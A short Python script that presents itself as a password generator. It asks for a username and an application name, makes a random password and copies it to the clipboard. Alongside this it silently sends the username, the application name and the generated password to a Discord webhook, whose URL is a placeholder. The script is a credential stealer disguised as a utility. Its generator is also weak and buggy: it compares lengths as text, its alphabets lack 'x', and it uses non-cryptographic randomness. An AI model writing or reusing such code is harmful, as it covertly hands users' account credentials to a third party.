from dhooks import Webhook

hook = Webhook("WEBHOOK_URL")

User = input("Write your username: ")
Application = input("Write your application name: ")

hook.send(f"User:{User}")
hook.send(f"Application:{Application}")


import random


LowPass = random.randint(1, 50)
choosepass = input("Password length [1,50]: ")



if choosepass > '50':
    print("The password is too long")
    print("Place a valid from 1 to 50")
    print("Try again")
    

if choosepass < '1':
    print("The password is too short")
    print("Place a valid from 1 to 50")
    print("Try again")

    
lower = "abcdefghijklmnopqrstuvwyz"
upper = "ABCDEFGHIJKLMNOPQRSTUVWYZ"
NUMBER = "0123456789"
Symbol = "@#€*.$^!%&"
all=lower + upper + NUMBER +Symbol
length = int(choosepass)
password = "".join(random.sample(all,length))
print(" ThePassword You Generated is :",password)
import pyperclip
pyperclip.copy('The text to be copied to the clipboard.')
spam = pyperclip.copy(password)
print("You have the password on your clipboard")
hook.send(password)
